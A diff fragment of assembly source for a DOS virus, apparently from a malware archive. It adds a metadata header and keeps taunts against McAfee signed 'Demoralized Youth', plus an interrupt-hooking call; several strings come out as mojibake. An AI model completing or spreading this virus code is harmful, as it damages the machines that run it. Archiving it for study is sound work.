@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      H
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
 _attr_  equ 0
 _date_  equ 2
 _time_  equ 4
@@ -13,7 +24,7 @@ dy      equ $-2-100h
 _size   dw      offset total-100h
 _ofs    dw      offset total
 
-db      'McAfee, geht nach Hause! Wir sind unÅberwindlich!'
+db      'McAfee, geht nach Hause! Wir sind unÔøΩberwindlich!'
 
 jump1:
         mov     ax,3521h
@@ -317,7 +328,7 @@ db 'Demoralized Youth vous a eu'
 
 total:
 pgf     equ $/16*2
-db 'Õ '
+db 'ÔøΩ '
 
 
 
